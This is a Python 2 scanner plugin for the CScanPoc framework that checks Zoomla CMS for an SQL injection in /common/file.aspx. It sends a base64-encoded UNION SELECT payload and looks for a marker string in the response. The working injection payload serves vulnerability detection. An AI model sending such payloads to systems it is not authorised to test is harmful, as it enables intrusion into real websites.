# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Zoomla_0003'  # 平台漏洞编号，留空
    name = '逐浪CMS SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-11-07'  # 漏洞公布时间
    desc = '''
        逐浪CMS /common/file.aspx SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=071205
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Zoomla'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'b27aebef-856b-433e-a292-74d45079d0e0'
    author = '国光'  # POC编写者
    create_date = '2018-05-13'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = ("/common/file.aspx?FD=MDAnIFVOSU9OIEFMTCBTRUxFQ1QgTlVMTCwgQ0hBUigxMTUpK0NIQVIoMTEzKStDSEFSKDEwOCkrQ0hBUig5NSkrQ0h"
                       "BUigxMDUpK0NIQVIoMTEwKStDSEFSKDEwNikrQ0hBUig5NSkrQ0hBUigxMTgpK0NIQVIoMTAxKStDSEFSKDExNCkrQ0hBUigxMDUpK0NIQVIoMT"
                       "AyKStDSEFSKDEyMSksTlVMTCxOVUxMLE5VTEwsTlVMTCxOVUxMLS0g&state=tr")
            target = '{target}'.format(target=self.target)+payload
            code, head, body, errcode, final_url = hh.http(target)

            if code == 500 and "sql_inj_verify" in body:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
